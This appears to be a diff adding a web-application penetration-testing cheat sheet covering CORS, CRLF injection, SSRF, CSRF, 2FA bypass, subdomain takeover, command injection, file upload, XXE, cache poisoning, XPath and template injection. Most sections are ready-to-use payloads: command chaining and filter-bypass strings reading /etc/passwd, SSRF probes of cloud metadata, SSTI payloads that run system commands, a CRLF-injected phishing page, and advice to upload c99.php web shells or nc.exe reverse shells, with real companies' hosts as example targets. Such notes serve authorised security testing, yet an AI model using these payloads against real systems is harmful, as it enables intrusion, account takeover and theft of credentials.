@@ -541,3 +541,357 @@ Subject: Email Forgery due to missing SPF
 - [5YMail](https://www.5ymail.com/)
 
 ---
+# CORS (Cross-Origin Resource Sharing) Security Testing Guide
+
+## 1. Testing CORS Misconfigurations
+
+### Steps to Check CORS Vulnerability:
+1. Add an `Origin` header.
+2. Set headers as:
+   ```
+   Origin: http://bing.com
+   Pragma: no-cache
+   Referer: https://bing.com/
+   ```
+3. Try `Origin: null`.
+4. Check for internal applications (same-site origin).
+
+### Insecure Configurations Detection (Response Headers):
+```bash
+curl -s --head 'http://api.view.yahoo.com/api/session/preferences'
+curl -s --head 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: http://view.yahoo.com'
+```
+
+**Vulnerable Headers:**
+```
+Access-Control-Allow-Origin: http://www.evil.com
+Access-Control-Allow-Origin: *
+```
+- `*` means it is allowing all domains (vulnerable setup).
+
+### Exploitation:
+- Look for `embed` parameters in URLs (`embed?url=`).
+- Modify `Origin`, `Pragma`, and `Referer` headers:
+   ```
+   Host: hackerseera.com
+   Origin: http://bing.com
+   Pragma: no-cache
+   Referer: https://bing.com/
+   ```
+- If response shows `Access-Control-Allow-Origin: http://bing.com`, the site is vulnerable.
+- Also, try `Origin: null`.
+
+### Poorly Implemented CORS:
+```bash
+Access-Control-Allow-Origin: https://anysite.com
+Access-Control-Allow-Credentials: true
+```
+- If `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`, it's misconfigured but not always exploitable.
+
+### Exploit with Curl:
+```bash
+curl http://any.com -H "Origin: http://www.bing.com" -I
+```
+
+## 2. CRLF Injection
+
+### Exploitation Examples:
+#### Add a Cookie:
+```
+http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
+```
+#### Bypass XSS Protection:
+```
+http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a<svg onload=alert(document.domain)>
+```
+#### Write HTML Response:
+```
+http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
+```
+
+## 3. Server-Side Request Forgery (SSRF)
+
+### Exploitation Techniques:
+1. Abuse trust:
+   ```
+   any.com/index/php?uri=http://external.com
+   ```
+2. Bypass IP whitelisting:
+   ```
+   any.com/index/php?uri=file:/etc/passwd
+   ```
+3. Scan internal networks:
+   ```
+   any.com/index/php?uri=http://localhost:1
+   ```
+4. Cloud metadata extraction:
+   ```
+   http://169.254.169.254/latest/meta-data/
+   ```
+
+### Testing with Burp Collaborator:
+1. Open Burp Collaborator.
+2. Set interaction poll.
+3. Inject payload in a vulnerable parameter:
+   ```
+   /showimage.php?file=http://burp-collaborator-url
+   ```
+4. Check logs in Burp for external requests.
+
+## 4. Critical Files Exposure
+
+### Impact:
+- Exposure of sensitive files like `database credentials`, `server authentication data`, or `business logic information`.
+
+### Scanning:
+```bash
+dirb http://target.com/ wordlist.txt
+gobuster dir -u http://target.com/ -w wordlist.txt
+```
+
+## 5. Cross-Site Request Forgery (CSRF)
+
+### Exploitation:
+#### Logout CSRF:
+```html
+<img src="http://target.com/logout.php">
+```
+#### Account Takeover CSRF:
+1. Capture a profile update request.
+2. Change `email` field in CSRF PoC.
+3. Open PoC in browser and submit.
+
+## 6. Two-Factor Authentication (2FA) Bypass
+
+### Exploitation:
+- Login to an account where 2FA is implemented.
+- Try directly accessing resources after authentication without entering OTP.
+
+## 7. Hostile Subdomain Takeover
+
+### Attack Scenario:
+1. Find subdomains that point to inactive services.
+2. Register on the third-party service and claim the subdomain.
+3. Set up phishing attacks on the hijacked subdomain.
+
+### Scanning for Takeovers:
+```bash
+ruby sub_brust.rb --fast nokia.com
+```
+
+## References:
+- [PayloadsAllTheThings - CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
+- [CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
+- [SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF)
+- [CSRF Exploits](https://github.com/qazbnm456/awesome-web-security/blob/master/README.md#csrf---cross-site-request-forgery)
+
+---
+# Security Testing Techniques
+
+## 13. Command Injection
+
+### Tool:
+- [Commix](https://github.com/commixproject/commix)
+
+### Identification:
+Find an input field that interacts with the operating system shell. Try executing system shell commands using delimiters.
+
+**Example:**
+```bash
+ping -c 5 127.0.0.1
+```
+
+**Possible Parameters:**
+`filename, darmon, host, upload, dir, execute, download, log, ip, cli, cmd, file=`
+
+**Example:**
+```bash
+;ls &&ls ||ls
+```
+
+### Bypass Methods:
+```bash
+;^& && | || %0D %0A \n <
+```
+
+### Brute-force:
+- Use a payload list of commands (`cmd.txt`).
+- Use a delimiter list (`delimeter_list`).
+- Cluster bomb attack: Combines different delimiters with parameters sequentially.
+
+**Setting Payload in Injection Point:**
+```bash
+filename=$delimeter.txt$$cmd.txt$
+```
+
+**Burp Suite Intruder:**
+- Use the cluster bomb attack type.
+- Set two payloads to generate combinations of attacks.
+
+### Exploitation Tool:
+```bash
+python commix.py -u <url>
+```
+
+### Chaining Commands:
+```bash
+original_cmd_by_server; ls
+original_cmd_by_server && ls
+original_cmd_by_server | ls
+original_cmd_by_server || ls  # Only if the first command fails
+```
+
+### Inside a Command:
+```bash
+original_cmd_by_server `cat /etc/passwd`
+original_cmd_by_server $(cat /etc/passwd)
+```
+
+### Bypass Techniques:
+```bash
+w'h'o'am'i  # Single quotes bypass
+w"h"o"am"i  # Double quotes bypass
+w\ho\am\i  # Backslash bypass
+/\b\i\n/////s\h  # Slash bypass
+who$@ami  # Using $@
+echo $0   # Identifying shell
+```
+
+---
+
+## 14. File Uploading
+
+### Tools:
+- [Fuxploider](https://github.com/almandin/fuxploider)
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
+
+### Methods:
+1. **Simple File Upload**
+   - Upload `c99.php` or `dhanush.php` for execution.
+   - Use `nc.exe` for a reverse shell (Windows).
+2. **Content-Type Bypass**
+   - Modify the `Content-Type` header in Burp Suite.
+   - Example: Change `text/php` to `image/jpeg`.
+3. **Extension Verification Bypass**
+   - Use double extensions (`shell.php.jpg`).
+
+### Tool:
+- [FuzzDB Malicious Images](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/file-upload/malicious-images)
+
+---
+
+## 15. XML External Entity (XXE) Injection
+
+### Payload:
+```xml
+<foo><text>Xml testing</text></foo>
+```
+
+### Exploitation:
+- Use `Burp Suite Intruder` to automate attacks.
+- Use `xml-attacks` payloads.
+
+---
+
+## Web Cache Deception Attack
+
+### Steps:
+1. Browse normally: `https://www.example.com/myaccount/home/`
+2. Open malicious link: `https://www.example.com/myaccount/home/malicious.css`
+3. The cache saves the page.
+4. Open in a private tab: `https://www.paypal.com/myaccount/home/malicious.css`
+
+### Cache Poisoning Headers:
+- `X-Forwarded-Host`
+- `X-Host`
+- `X-Forwarded-Scheme`
+- `X-Original-URL`
+- `X-Rewrite-URL`
+
+### Example Attack:
+```http
+GET /test?buster=123 HTTP/1.1
+Host: target.com
+X-Forwarded-Host: test"><script>alert(1)</script>
+```
+
+---
+
+## Insecure Direct Object References (IDOR)
+
+### Tools:
+- Burp Suite Plugins: `Authz`, `AuthMatrix`, `Authorize`
+
+### Example Parameters:
+- `http://foo.bar/somepage?invoice=12345`
+- `http://foo.bar/changepassword?user=someuser`
+- `http://foo.bar/showImage?img=img00011`
+
+---
+
+## XPATH Injection
+
+### Example Payloads:
+```xpath
+' or '1'='1
+' or ''=''
+x' or 1=1 or 'x'='y
+```
+
+### Blind Exploitation:
+```xpath
+and string-length(account)=SIZE_INT
+```
+
+### Tools:
+- [xcat](https://github.com/orf/xcat)
+- [xxxpwn](https://github.com/feakk/xxxpwn)
+- [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
+- [XmlChor](https://github.com/Harshal35/XMLCHOR)
+
+---
+
+## XSLT Injection
+
+### Description:
+Processing an unvalidated XSL stylesheet can allow an attacker to change XML structure, include arbitrary files, or execute commands.
+
+### Tools:
+- [PayloadsAllTheThings - XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection#tools)
+
+---
+
+## Template Injection (SSTI)
+
+### Tools:
+- [Tplmap](https://github.com/epinna/tplmap)
+
+### Basic Injections:
+#### ERB Engine:
+```erb
+<%= 7 * 7 %>
+<%= File.open('/etc/passwd').read %>
+<%= system('cat /etc/passwd') %>
+```
+
+#### Java:
+```java
+${7*7}
+${class.getClassLoader()}
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+```
+
+#### Twig:
+```twig
+{{7*7}}
+{{7*'7'}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+```
+
+---
+
+
+
+
